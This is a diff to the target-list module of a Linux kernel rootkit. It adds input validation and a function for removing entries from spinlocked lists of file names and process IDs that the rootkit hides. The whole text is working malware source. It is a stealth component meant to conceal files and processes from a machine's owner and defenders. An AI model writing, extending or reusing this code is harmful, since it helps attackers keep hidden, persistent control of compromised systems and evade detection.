@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: GPL-2.0
 // core/target.c - Spinlocked target lists for hiding.
-#include <linux/string.h>
 #include "rootkit.h"
+#include <linux/string.h>
 
 struct rk_target_list rk_file_targets;
 struct rk_target_list rk_pid_targets;
@@ -19,6 +19,8 @@ int rk_target_add(struct rk_target_list *list, const char *name)
 	unsigned long flags;
 	int idx;
 
+	if (!name || !*name)
+		return -EINVAL;
 	spin_lock_irqsave(&list->lock, flags);
 	if (list->count >= RK_TARGET_MAX) {
 		idx = -ENOSPC;
@@ -51,6 +53,27 @@ out:
 	return ret;
 }
 
+int rk_target_remove_name(struct rk_target_list *list, const char *name)
+{
+	unsigned long flags;
+	int i;
+
+	spin_lock_irqsave(&list->lock, flags);
+	for (i = 0; i < list->count; i++) {
+		if (strcmp(list->targets[i], name) == 0) {
+			if (i < list->count - 1)
+				memmove(&list->targets[i],
+					&list->targets[i + 1],
+					(list->count - i - 1) * RK_NAME_MAX);
+			list->count--;
+			spin_unlock_irqrestore(&list->lock, flags);
+			return 0;
+		}
+	}
+	spin_unlock_irqrestore(&list->lock, flags);
+	return -ENOENT;
+}
+
 void rk_target_clear(struct rk_target_list *list)
 {
 	unsigned long flags;
@@ -77,8 +100,7 @@ bool rk_target_match(struct rk_target_list *list, const char *name)
 	return found;
 }
 
-bool rk_line_matches(struct rk_target_list *list,
-		     const char *line, int len)
+bool rk_line_matches(struct rk_target_list *list, const char *line, int len)
 {
 	unsigned long flags;
 	bool found = false;
